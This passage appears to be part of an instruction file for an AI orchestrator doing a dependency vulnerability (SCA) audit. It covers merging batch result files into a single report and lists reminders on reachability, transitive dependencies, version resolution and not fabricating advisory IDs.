After **all** Phase 2 batch subagents complete, read every `sast/sca-batch-*.md` file and merge them into a single `sast/sca-results.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `sast/sca-batch-1.md`, `sast/sca-batch-2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary (candidates analyzed = total candidates from recon that were batched; it equals the four classification counts plus the hygiene-only items).
4. Collect every line from the `## Hygiene` sections of the batch files and de-duplicate them.
5. Write the merged report to `sast/sca-results.md` using this format:

```markdown
# SCA Analysis Results: [Project Name]

## Executive Summary
- Candidates analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]
- Hygiene-only items: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]

## Hygiene

[All de-duplicated hygiene lines from the batch files — missing lockfiles, floating versions,
 EOL runtimes / frameworks, non-default sources. Omit this section if there are none.]
```

6. After writing `sast/sca-results.md`, **delete all intermediate batch files** (`sast/sca-batch-*.md`).

---

## Important Reminders

- Read `sast/architecture.md` and pass its content to all subagents as context.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 candidates per subagent**. If there are 1-3 candidates total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned candidates' text (plus the short Inventory section) from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is inventory and advisory matching**: resolve exact versions and match them against advisories. Do not trace user input in Phase 1 — that is Phase 2's job.
- **Phase 2 is reachability analysis**: scope, feature usage, attacker input, version re-check, mitigations — in that order.
- **Never fabricate** CVE / GHSA IDs, affected ranges, or fixed versions. If you are not certain, write "advisory ID unverified" and describe the issue. One invented CVE undermines the whole report.
- **A CVE alone is not a finding**: reachability decides Vulnerable vs. Likely Vulnerable, and an affected version whose vulnerable feature is provably unused is Not Vulnerable.
- **Transitive dependencies count**: they are on the classpath / in `node_modules` and are exploitable exactly like direct ones. Remediate with an override (Maven `<dependencyManagement>`, Gradle constraint, npm `overrides`) when the direct parent cannot be upgraded.
- **Lockfile beats manifest**, and the Spring Boot parent / BOM manages most Java library versions — resolve the real version before matching.
- **Frontend packages bundled into the Angular build are production scope**: they run in every user's browser, regardless of whether they are listed under `dependencies` or `devDependencies`.
- **`devDependencies` used only at build time** are not runtime-exploitable, but they matter for supply chain (install scripts, build-time code execution) — note it in the Reason, do not escalate.
- **Vendored libraries are easy to miss**: a `jquery-1.x.min.js` in a static folder never appears in any manifest. Search static asset folders explicitly.
- **No third-party tools required**: knowledge-based matching is the default path. Auditing tools are used only when already installed; never install anything.
- **Knowledge has a cutoff**: the absence of a known advisory is not proof of safety. Recommend running `osv-scanner` or enabling Dependabot / Renovate in Needs Manual Review suggestions where coverage is uncertain.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Clean up intermediate files: delete all `sast/sca-batch-*.md` files after the final `sast/sca-results.md` is written. **Preserve** `sast/sca-recon.md` — the orchestrator reuses it on later runs.
